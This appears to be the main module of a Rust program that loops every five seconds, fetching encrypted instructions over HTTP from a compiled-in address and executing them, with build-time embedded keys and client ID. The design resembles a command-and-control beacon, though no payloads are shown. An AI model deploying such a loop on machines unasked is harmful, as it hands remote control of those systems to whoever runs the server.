mod command;
mod crypto;
mod dev;
mod tangerine;

use tangerine::Tangerine;

use std::time::Duration;
use std::{env, thread};

include!(concat!(env!("OUT_DIR"), "/id.rs"));

type Res<T> = Result<T, Box<dyn std::error::Error>>;

pub async fn run() -> Res<()> {
    let crypto = crypto::Crypto::build(encryption_key(), nonce())?;

    let args: Vec<String> = env::args().collect();
    if args.len() >= 2 {
        return dev::execute_command(&args[1], client_id(), &crypto);
    }

    // Eat my tangerine
    let mut tangerine = Tangerine::new();
    loop {
        let _response = tangerine
            .from_http(base_uri(), client_id(), &crypto)
            .await?;
        tangerine.execute().await?;
        thread::sleep(Duration::from_secs(5));
    }
}
